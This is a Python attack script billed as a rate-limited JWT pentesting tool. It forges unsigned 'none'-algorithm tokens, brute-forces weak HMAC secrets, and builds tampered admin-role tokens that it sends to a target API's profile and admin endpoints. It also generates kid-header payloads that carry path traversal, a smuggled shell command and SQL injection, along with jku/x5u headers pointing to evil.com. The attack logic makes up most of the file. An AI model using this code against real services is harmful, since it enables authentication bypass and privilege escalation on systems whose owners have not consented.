#!/usr/bin/env python3
"""
JWT SMART MODE - Professional Pentesting Script
Max 15 requests - for production/rate-limited environments
Author: netcuter
"""

import argparse
import base64
import json
import hmac
import hashlib
import sys
from datetime import datetime

try:
    import requests
except ImportError:
    print("Installing requests...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "--break-system-packages", "-q"])
    import requests

# Common weak secrets for bruteforce
WEAK_SECRETS = ["secret", "password", "123456", "admin", "jwt_secret", "key", "private", "default"]

class JWTSmartTester:
    def __init__(self, token, api_url=None, verbose=True):
        self.token = token
        self.api_url = api_url
        self.verbose = verbose
        self.request_count = 0
        self.max_requests = 15
        self.findings = []
        self.parse_token()
    
    def log(self, msg, level="INFO"):
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m",
            "WARNING": "\033[93m", 
            "CRITICAL": "\033[91m",
            "RESET": "\033[0m"
        }
        if self.verbose:
            print(f"{colors.get(level, '')}{msg}{colors['RESET']}")
    
    def b64url_encode(self, data):
        if isinstance(data, str):
            data = data.encode()
        return base64.urlsafe_b64encode(data).decode().rstrip('=')
    
    def b64url_decode(self, data):
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        return base64.urlsafe_b64decode(data)
    
    def parse_token(self):
        parts = self.token.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")
        
        self.header = json.loads(self.b64url_decode(parts[0]))
        self.payload = json.loads(self.b64url_decode(parts[1]))
        self.signature = parts[2]
        self.header_b64 = parts[0]
        self.payload_b64 = parts[1]
    
    def create_jwt(self, header, payload, secret=None):
        header_b64 = self.b64url_encode(json.dumps(header))
        payload_b64 = self.b64url_encode(json.dumps(payload))
        
        if secret and header.get('alg') == 'HS256':
            signing_input = f"{header_b64}.{payload_b64}"
            signature = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
            signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            return f"{signing_input}.{signature_b64}"
        else:
            return f"{header_b64}.{payload_b64}."
    
    def send_request(self, token, endpoint="/api/profile"):
        if not self.api_url:
            return None, None
        
        if self.request_count >= self.max_requests:
            self.log(f"⚠️ Max requests ({self.max_requests}) reached!", "WARNING")
            return None, None
        
        self.request_count += 1
        self.log(f"[Request {self.request_count}/{self.max_requests}]")
        
        try:
            url = f"{self.api_url.rstrip('/')}{endpoint}"
            resp = requests.get(url, headers={"Authorization": f"Bearer {token}"}, timeout=10)
            return resp.status_code, resp.json() if resp.text else {}
        except Exception as e:
            return None, {"error": str(e)}
    
    def test_none_algorithm(self):
        """TEST 1: None Algorithm Attack (CVE-2015-9235)"""
        self.log("\n🔴 [1/7] Testing None Algorithm (CVE-2015-9235)...", "INFO")
        
        # Variants to try
        variants = [
            {"alg": "none", "typ": "JWT"},
            {"alg": "None", "typ": "JWT"},
            {"alg": "NONE", "typ": "JWT"},
            {"alg": "nOnE", "typ": "JWT"},
        ]
        
        results = []
        for none_header in variants:
            none_token = self.create_jwt(none_header, self.payload)
            results.append({
                "variant": none_header["alg"],
                "token": none_token[:60] + "..."
            })
            
            if self.api_url:
                status, resp = self.send_request(none_token)
                if status == 200:
                    self.findings.append({
                        "severity": "CRITICAL",
                        "vuln": "None Algorithm Bypass",
                        "cve": "CVE-2015-9235",
                        "token": none_token
                    })
                    self.log(f"🚨 VULNERABLE! alg={none_header['alg']} accepted!", "CRITICAL")
                    return True
        
        self.log(f"Generated {len(results)} none-alg tokens for manual testing")
        return results
    
    def test_weak_secrets(self):
        """TEST 2: Weak Secret Bruteforce (Top 8)"""
        self.log("\n🟠 [2/7] Testing Weak Secrets...", "INFO")
        
        for secret in WEAK_SECRETS[:8]:  # Top 8 only
            try:
                # Try to verify with weak secret
                signing_input = f"{self.header_b64}.{self.payload_b64}"
                expected_sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
                expected_sig_b64 = base64.urlsafe_b64encode(expected_sig).decode().rstrip('=')
                
                if expected_sig_b64 == self.signature:
                    self.findings.append({
                        "severity": "CRITICAL",
                        "vuln": "Weak Secret",
                        "secret": secret
                    })
                    self.log(f"🚨 SECRET FOUND: '{secret}'", "CRITICAL")
                    return secret
            except:
                pass
        
        self.log("No weak secrets found in top 8 wordlist")
        return None
    
    def test_role_tampering(self, weak_secret=None):
        """TEST 3: Role/Privilege Escalation"""
        self.log("\n🟠 [3/7] Testing Role Tampering...", "INFO")
        
        # Common privilege escalation attempts
        tamper_fields = [
            ("role", "admin"),
            ("admin", True),
            ("is_admin", True),
            ("user_type", "admin"),
            ("privilege", "admin"),
            ("level", 999),
        ]
        
        tampered_tokens = []
        for field, value in tamper_fields:
            tampered_payload = self.payload.copy()
            tampered_payload[field] = value
            
            if weak_secret:
                tampered_token = self.create_jwt(self.header, tampered_payload, weak_secret)
            else:
                # Create with none alg for manual testing
                none_header = {"alg": "none", "typ": "JWT"}
                tampered_token = self.create_jwt(none_header, tampered_payload)
            
            tampered_tokens.append({
                "field": field,
                "value": value,
                "token": tampered_token[:60] + "..."
            })
            
            if self.api_url and weak_secret:
                status, resp = self.send_request(tampered_token, "/api/admin")
                if status == 200:
                    self.findings.append({
                        "severity": "CRITICAL",
                        "vuln": "Privilege Escalation",
                        "field": field,
                        "token": tampered_token
                    })
                    self.log(f"🚨 ESCALATED! {field}={value} worked!", "CRITICAL")
        
        self.log(f"Generated {len(tampered_tokens)} tampered tokens")
        return tampered_tokens
    
    def test_missing_claims(self):
        """TEST 4: Check Missing Security Claims"""
        self.log("\n🟡 [4/7] Checking Missing Claims...", "INFO")
        
        required_claims = ["iss", "aud", "exp", "iat", "jti", "nbf"]
        missing = [c for c in required_claims if c not in self.payload]
        
        if missing:
            self.findings.append({
                "severity": "MEDIUM",
                "vuln": "Missing Claims",
                "missing": missing
            })
            self.log(f"⚠️ Missing claims: {', '.join(missing)}", "WARNING")
        return missing
    
    def test_expiration(self):
        """TEST 5: Check Token Expiration"""
        self.log("\n🟡 [5/7] Checking Expiration...", "INFO")
        
        if "exp" in self.payload:
            exp = self.payload["exp"]
            now = datetime.utcnow().timestamp()
            if exp < now:
                self.findings.append({
                    "severity": "MEDIUM",
                    "vuln": "Expired Token",
                    "exp": exp,
                    "now": now
                })
                self.log(f"⚠️ Token EXPIRED! exp={exp}, now={now}", "WARNING")
                return True
            else:
                remaining = exp - now
                self.log(f"✓ Token valid for {remaining/3600:.1f} hours")
        return False
    
    def test_kid_injection(self):
        """TEST 6: KID (Key ID) Injection"""
        self.log("\n🔴 [6/7] Testing KID Injection...", "INFO")
        
        kid_payloads = [
            "../../../../../../dev/null",
            "/dev/null",
            "key.pem; ls -la",
            "' OR '1'='1",
            "key' AND '1'='1",
        ]
        
        tokens = []
        for kid in kid_payloads:
            header = self.header.copy()
            header["kid"] = kid
            token = self.create_jwt(header, self.payload)
            tokens.append({"kid": kid, "token": token[:60] + "..."})
        
        self.log(f"Generated {len(tokens)} KID injection tokens")
        return tokens
    
    def test_jku_x5u_injection(self):
        """TEST 7: JKU/X5U Header Injection"""
        self.log("\n🔴 [7/7] Testing JKU/X5U Injection...", "INFO")
        
        # These would point to attacker-controlled server
        injections = [
            ("jku", "https://evil.com/jwks.json"),
            ("x5u", "https://evil.com/cert.pem"),
            ("jwk", {"kty": "oct", "k": "attackerkey"}),
        ]
        
        tokens = []
        for header_key, value in injections:
            header = self.header.copy()
            header[header_key] = value
            token = self.create_jwt(header, self.payload)
            tokens.append({header_key: str(value)[:30], "token": token[:60] + "..."})
        
        self.log(f"Generated {len(tokens)} JKU/X5U injection tokens")
        return tokens
    
    def run_all_tests(self):
        """Run all smart tests"""
        print("\n╔════════════════════════════════════════════════════════════╗")
        print("║  🎯 JWT SMART MODE - 7 Priority Tests (Max 15 Requests)   ║")
        print("╚════════════════════════════════════════════════════════════╝")
        
        print(f"\n📝 Original Token Analysis:")
        print(f"   Algorithm: {self.header.get('alg', 'unknown')}")
        print(f"   Claims: {', '.join(self.payload.keys())}")
        
        # Run tests
        self.test_none_algorithm()
        weak_secret = self.test_weak_secrets()
        self.test_role_tampering(weak_secret)
        self.test_missing_claims()
        self.test_expiration()
        self.test_kid_injection()
        self.test_jku_x5u_injection()
        
        # Summary
        print("\n╔════════════════════════════════════════════════════════════╗")
        print("║  📊 FINDINGS SUMMARY                                       ║")
        print("╚════════════════════════════════════════════════════════════╝")
        
        critical = [f for f in self.findings if f["severity"] == "CRITICAL"]
        medium = [f for f in self.findings if f["severity"] == "MEDIUM"]
        
        print(f"\n🔴 CRITICAL: {len(critical)}")
        for f in critical:
            print(f"   • {f['vuln']}")
        
        print(f"\n🟡 MEDIUM: {len(medium)}")
        for f in medium:
            print(f"   • {f['vuln']}")
        
        print(f"\n📊 Requests used: {self.request_count}/{self.max_requests}")
        
        return self.findings


def main():
    parser = argparse.ArgumentParser(description="JWT Smart Mode Tester")
    parser.add_argument("token", nargs="?", help="JWT token to test")
    parser.add_argument("-u", "--url", help="API URL for online testing")
    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode")
    args = parser.parse_args()
    
    if not args.token:
        print("JWT SMART MODE - Enter token:")
        args.token = input().strip()
    
    tester = JWTSmartTester(args.token, args.url, not args.quiet)
    findings = tester.run_all_tests()
    
    # Exit code based on findings
    sys.exit(1 if any(f["severity"] == "CRITICAL" for f in findings) else 0)


if __name__ == "__main__":
    main()
